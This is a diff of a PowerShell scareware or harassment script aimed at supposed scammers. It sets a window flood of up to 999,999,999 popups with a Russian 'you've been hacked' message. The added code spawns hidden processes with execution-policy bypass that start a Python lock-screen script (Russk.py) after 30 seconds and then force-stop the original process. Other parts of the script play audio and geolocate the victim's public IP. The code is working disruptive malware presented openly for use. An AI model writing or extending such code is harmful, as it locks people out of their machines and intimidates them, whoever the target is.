@@ -1,4 +1,4 @@
-﻿param(
+param(
     [ValidateRange(1, 999999999)]
     [int]$WindowCount = 999999999,
     [string]$WindowMessage = "Тебя взломали, уже поздно, ты — скамер.",
@@ -22,6 +22,36 @@ Start-Process -FilePath $currentExecutable -ArgumentList @(
     "-File",
     ('"{0}"' -f $lautScriptPath)
 ) | Out-Null
+
+$lockScreenScriptPath = Join-Path $PSScriptRoot "Russk.py"
+$pythonCommand = Get-Command python -ErrorAction SilentlyContinue
+if (-not $pythonCommand) {
+    $pythonCommand = Get-Command py -ErrorAction SilentlyContinue
+}
+if ($pythonCommand -and (Test-Path -LiteralPath $lockScreenScriptPath)) {
+    $lockCommand = @"
+Start-Sleep -Seconds 30
+if (Test-Path -LiteralPath '$lockScreenScriptPath') {
+    & '$($pythonCommand.Source)' '$lockScreenScriptPath'
+}
+"@
+    Start-Process -FilePath $currentExecutable -ArgumentList @(
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-Command",
+        $lockCommand
+    ) | Out-Null
+
+    $shutdownCommand = "Start-Sleep -Seconds 30; Stop-Process -Id $PID -Force"
+    Start-Process -FilePath $currentExecutable -ArgumentList @(
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-Command",
+        $shutdownCommand
+    ) | Out-Null
+}
 
 $files = @(
     (Join-Path $PSScriptRoot "TTSOL-ru-RU-Dmitry-20260911-211138.mp3"),
@@ -116,11 +146,7 @@ function Get-PublicIpGeo {
 function Get-WorldMapImage {
     $mapPath = Join-Path $env:TEMP "bloody-scammer-worldmap.jpg"
     if (-not (Test-Path -LiteralPath $mapPath)) {
-        try {
-            Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Equirectangular_projection_SW.jpg/1280px-Equirectangular_projection_SW.jpg" -OutFile $mapPath -TimeoutSec 20
-        } catch {
-            return $null
-        }
+        return $null
     }
     try {
         $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
